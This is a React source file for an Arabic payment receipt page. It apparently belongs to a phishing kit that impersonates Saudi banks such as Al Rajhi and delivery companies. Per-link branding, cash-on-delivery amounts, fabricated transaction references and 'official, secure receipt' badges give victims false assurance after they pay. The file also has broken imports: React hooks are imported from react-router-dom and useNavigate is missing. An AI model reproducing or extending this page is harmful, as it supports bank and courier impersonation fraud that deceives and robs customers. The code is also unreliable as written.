import { useParams, useSearchParams, useMemo, useEffect } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useLinkData } from "@/hooks/useLinkData";
import { CheckCircle2, Download, Share2, ArrowRight, Printer, ShieldCheck, Calendar, Hash, CreditCard, Building2, User, Truck, Wallet } from "lucide-react";
import { bankBranding } from "@/lib/brandingSystem";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";

const PaymentReceiptPage = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
  const companyKey = linkData?.payload?.service_key || searchParams.get("company") || '';
  const serviceBranding = getServiceBranding(companyKey);
  const companyBranding = companyKey ? shippingCompanyBranding[companyKey.toLowerCase()] : null;

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    if (selectedBankId) {
      return getEntityVisualSpec(selectedBankId);
    }
    if (companyKey) {
      return getEntityVisualSpec(companyKey);
    }
    return null;
  }, [selectedBankId, companyKey]);

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  // Visual values
  const primaryColor = entitySpec?.colors.primary || selectedBankBranding.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || selectedBankBranding.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || selectedBankBranding.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || selectedBankBranding.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || selectedBankBranding.colors.text || companyBranding?.colors.text || '#1A1A1A';
  const textLightColor = entitySpec?.colors.textLight || selectedBankBranding.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || selectedBankBranding.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || selectedBankBranding.fonts.arabic || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif';
  const borderRadius = entitySpec?.dimensions.borderRadius || selectedBankBranding.borderRadius?.lg || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const cardShadow = entitySpec?.shadows.card || selectedBankBranding.shadows?.lg || companyBranding?.shadows.lg || '0 40px 100px rgba(0,0,0,0.1)';
  const buttonShadow = entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`;
  const logoUrl = entitySpec?.assets.logo || selectedBankBranding.logo || companyBranding?.logoUrl || '';
  const entityNameAr = entitySpec?.entityNameAr || selectedBank?.nameAr || serviceBranding.nameAr || companyKey;
  const entityNameEn = entitySpec?.entityNameEn || selectedBank?.name || serviceBranding.nameEn || companyKey;
  const category = entitySpec?.category || 'bank';

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  if (linkLoading || !linkData) return null;

  const refNumber = `TRX-${id?.slice(0, 8).toUpperCase()}`;

  // Category icon
  const CategoryIcon = category === 'shipping' || category === 'postal' ? Truck :
                       category === 'bank' ? Building2 :
                       Wallet;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor, fontFamily }}>
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey || "bank"}
        serviceName={entityNameAr}
        title="إيصال الدفع الإلكتروني"
      />

      {/* Entity Header */}
      <header className="bg-white border-b-4 h-16 sm:h-20 flex items-center sticky top-0 z-50 shadow-md" style={{ backgroundColor: surfaceColor, borderBottomColor: primaryColor }}>
        <div className="container mx-auto px-4 flex items-center justify-between">
          <div className="w-32 sm:w-40 h-10 flex items-center">
            {selectedBankId ? (
              <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="md" />
            ) : logoUrl ? (
              <img src={logoUrl} alt={entityNameAr} className="h-8 sm:h-10 w-auto object-contain" />
            ) : (
              <div className="flex items-center gap-2 font-bold" style={{ color: primaryColor }}>
                <ShieldCheck className="w-6 h-6" />
                <span>SECURE RECEIPT</span>
              </div>
            )}
          </div>
          <div className="flex items-center gap-4">
            <button onClick={() => window.print()} className="p-2 transition-colors" style={{ color: textLightColor }}>
              <Printer className="w-5 h-5" />
            </button>
            <div className="h-6 w-px" style={{ backgroundColor: borderColor }} />
            <Button variant="ghost" size="sm" className="font-bold text-xs" onClick={() => navigate('/')}>
              خروج
            </Button>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-12 max-w-xl">
        <div className="text-center mb-10 space-y-4">
          <div className="w-24 h-24 rounded-full flex items-center justify-center mx-auto shadow-inner border animate-in zoom-in duration-700" style={{ backgroundColor: `${primaryColor}08`, borderColor: `${primaryColor}20` }}>
            <CheckCircle2 className="w-14 h-14" style={{ color: primaryColor }} />
          </div>
          <div className="space-y-1">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: textColor }}>تمت العملية بنجاح</h1>
            <p className="text-sm font-medium uppercase tracking-wide" style={{ color: textLightColor }}>Payment Successfully Processed</p>
          </div>
        </div>

        <Card className="border-none overflow-hidden relative print:shadow-none" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
          <div className="absolute top-0 left-0 w-full h-2" style={{ backgroundColor: primaryColor }} />

          <div className="p-8 sm:p-12 text-center border-b border-dashed" style={{ backgroundColor: `${primaryColor}03`, borderColor }}>
            <p className="text-[11px] font-bold uppercase tracking-widest mb-3" style={{ color: textLightColor }}>قيمة العملية</p>
            <h2 className="text-4xl sm:text-5xl font-bold tracking-tighter mb-4" style={{ color: textColor }}>{formattedAmount}</h2>
            <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full border text-[10px] font-bold" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>عملية معتمدة وآمنة</span>
            </div>
          </div>

          <div className="p-8 sm:p-12 space-y-8">
            <div className="grid grid-cols-1 gap-6">
              <div className="flex items-center justify-between py-1">
                <div className="flex items-center gap-3" style={{ color: textLightColor }}>
                  <Hash className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">رقم المرجع</span>
                </div>
                <span className="font-bold font-mono" style={{ color: textColor }}>{refNumber}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor }}>
                <div className="flex items-center gap-3" style={{ color: textLightColor }}>
                  <Calendar className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">التاريخ والوقت</span>
                </div>
                <span className="font-bold" style={{ color: textColor }}>{new Date().toLocaleString('ar-SA')}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor }}>
                <div className="flex items-center gap-3" style={{ color: textLightColor }}>
                  <Building2 className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">الجهة المستفيدة</span>
                </div>
                <span className="font-bold" style={{ color: textColor }}>{linkData?.payload?.service_name || entityNameAr}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor }}>
                <div className="flex items-center gap-3" style={{ color: textLightColor }}>
                  <User className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">اسم العميل</span>
                </div>
                <span className="font-bold" style={{ color: textColor }}>{linkData?.payload?.customerInfo?.name || linkData?.payload?.customerInfo?.fullName || 'غير متوفر'}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor }}>
                <div className="flex items-center gap-3" style={{ color: textLightColor }}>
                  <CreditCard className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">طريقة الدفع</span>
                </div>
                <span className="font-bold" style={{ color: textColor }}>{selectedBank?.nameAr || 'بطاقة بنكية'}</span>
              </div>
            </div>

            <div className="pt-10 flex gap-4 print:hidden">
              <Button className="flex-1 text-lg font-bold shadow-xl gap-3" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, boxShadow: buttonShadow, borderRadius, height: buttonHeight, color: entitySpec?.colors.textOnPrimary || '#FFFFFF' }}>
                <Download className="w-5 h-5" />
                <span>حفظ الإيصال</span>
              </Button>
              <Button variant="outline" className="w-16 border-2 hover:bg-slate-50 transition-colors" style={{ borderRadius, borderColor }}>
                <Share2 className="w-6 h-6" style={{ color: textLightColor }} />
              </Button>
            </div>
          </div>

          <div className="p-8 text-center space-y-4" style={{ backgroundColor: `${primaryColor}03` }}>
            <div className="flex items-center justify-center gap-3 h-5" style={{ opacity: 0.4, filter: 'grayscale(1)' }}>
              <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
              <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
              <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
            </div>
            <p className="text-[9px] font-bold uppercase tracking-widest" style={{ color: textLightColor }}>Official Digital Payment Receipt</p>
          </div>
        </Card>

        <div className="mt-12 flex flex-col items-center gap-6 print:hidden">
          <Button variant="link" className="font-bold hover:transition-colors flex items-center gap-2" style={{ color: textLightColor }} onClick={() => navigate('/')}>
            <span>العودة للرئيسية</span>
            <ArrowRight className="w-4 h-4" />
          </Button>
          <div className="flex items-center gap-3 p-4 rounded-2xl border border-dashed" style={{ backgroundColor: `${primaryColor}03`, borderColor, color: textLightColor }}>
            <ShieldCheck className="w-5 h-5" style={{ color: primaryColor }} />
            <p className="text-[10px] font-bold leading-relaxed uppercase tracking-tighter">إيصال إلكتروني موثق لا يحتاج إلى ختم أو توقيع.</p>
          </div>
        </div>
      </main>
    </div>
  );
};

export default PaymentReceiptPage;
